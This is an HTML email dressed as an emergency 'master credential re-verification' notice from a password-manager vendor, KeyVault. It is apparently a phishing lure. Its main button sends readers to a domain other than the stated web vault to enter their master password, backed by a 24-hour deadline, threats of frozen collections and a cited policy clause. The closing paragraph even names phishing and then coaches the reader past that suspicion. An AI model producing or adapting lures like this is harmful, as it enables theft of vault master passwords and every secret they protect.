<p style="background:#FFEBEE;border-left:4px solid #B71C1C;padding:12px">
<b>EMERGENCY ROTATION EVENT KV-E2027-0630 — MASTER CREDENTIAL RE-VERIFICATION.</b>
A third-party marketing-platform breach (disclosed last night) exposed credential lists including
addresses on your corporate domain. Per your organization's rotation policy (Security Baseline
§7.2, breach-triggered), KeyVault has scheduled an <b>enterprise-wide vault rotation</b> tonight.
Because KeyVault is <b>zero-knowledge</b> — we hold your vaults encrypted and cannot read them —
rotation requires each <b>collection owner to re-verify the master credential once</b> so vaults
re-encrypt under new keys. The rotation window closes <b>24 hours after this notice</b>; unverified
collections freeze read-only (break-glass access via your CISO's recovery kit).
</p>

<h3>1. Rotation Event Scope</h3>
<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
<tr><td style="background:#f5f5f5;width:280px">Event</td><td><b>KV-E2027-0630</b> (trigger: third-party breach, 41,000 corporate addresses)</td></tr>
<tr><td style="background:#f5f5f5">Your org</td><td>Enterprise plan, 214 seats, 38 collections</td></tr>
<tr><td style="background:#f5f5f5">Affected collections</td><b>9</b> (owners on the exposed address list)</td></tr>
<tr><td style="background:#f5f5f5">Rotation window</td><b>24 hours</b> (unverified collections freeze read-only)</td></tr>
<tr><td style="background:#f5f5f5">Policy basis</td><td>Your Security Baseline §7.2 (breach-triggered rotation)</td></tr>
</table>

<h3>2. Master Credential Re-Verification (One Step)</h3>
<p>Sign in on the re-verification page with your <b>work email + vault master password</b> — the vault
decrypts locally, re-keys, and rotation completes silently for your collections. Nothing is
transmitted that we can read; the master password is used <b>only in your browser session</b>
to unlock the re-encryption.</p>

<p style="text-align:center;margin:18px 0">
<a href="https://kv-emergency.example/rotation/KV-E2027-0630/verify" style="display:inline-block;background:#B71C1C;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Re-Verify Master Credential</a>
</p>
<p style="font-size:13px;color:#666;text-align:center">Web vault: https://vault.keyvault.example (rotation banner appears there too)</p>

<h3>3. What Happens After the Window</h3>
<ul>
<li>Unverified collections: freeze read-only — autofill stops, secrets viewable via recovery kit only</li>
<li>Autofill outage across the frozen collections (9 of 38 — including the infrastructure collection)</li>
<li>Catch-up rotation: requires the CISO recovery ceremony (2 key holders + audit log), scheduled weekly</li>
</ul>

<p style="font-size:14px;background:#FFF3E0;padding:12px">A password-manager email asking for your
master password should trip every alarm — phishing against vaults is the highest-value attack there
is, and your suspicion is exactly right. Checks: the same rotation banner appears in the web vault
you reach by typing the address yourself; the event ID matches your admin console's audit log;
and your helpdesk can confirm the breach-triggered policy clause. We know zero-knowledge means
"no one at KeyVault can ever ask for your password" — which is why the re-verification happens
in the vault's own session, and why the only master-password field you should ever type into is
on the vault domain you navigate to yourself.</p>

